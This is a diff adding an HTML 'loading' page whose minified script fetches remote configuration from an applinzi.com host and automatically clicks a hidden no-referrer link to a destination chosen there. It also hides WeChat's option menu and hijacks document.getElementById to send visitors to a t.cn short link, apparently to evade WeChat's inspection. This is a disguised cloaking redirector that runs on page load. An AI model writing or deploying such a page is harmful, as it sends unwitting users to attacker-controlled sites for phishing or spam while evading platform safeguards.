@@ -1,0 +1,18 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>loading</title>
+</head>
+<body>
+<style>
+        iframe{display: none;}
+</style>
+<a href="#" rel="noreferrer" id="jumps"></a>
+<script>
+    loadJs("//map3306.applinzi.com/config.js?io=king",function(){document.getElementById("jumps").href=link;document.getElementById("jumps").click()});loadJs("//res.wx.qq.com/open/js/jweixin-1.2.0.js?t="+new Date().getTime(),function(){document.addEventListener("WeixinJSBridgeReady",function onBridgeReady(){WeixinJSBridge.call("hideOptionMenu")})});var o=document.getElementById;document.getElementById=function(a){if(a=="_edw_iframe_"){location.href="http://t.cn/RSnoEMJ";return{}}else{return o.call(document,a)}};function loadJs(src,callback,errCallback){if(!src){return}var e=document.createElement("script");e.setAttribute("type","text/javascript");e.setAttribute("charset","utf-8");e.setAttribute("src",src);document.getElementsByTagName("head")[0].appendChild(e);if(typeof errCallback=="function"){e.onerror=errCallback}e.onload=function(){if(typeof callback=="function"){callback()}}};
+</script>
+</body>
+</html>
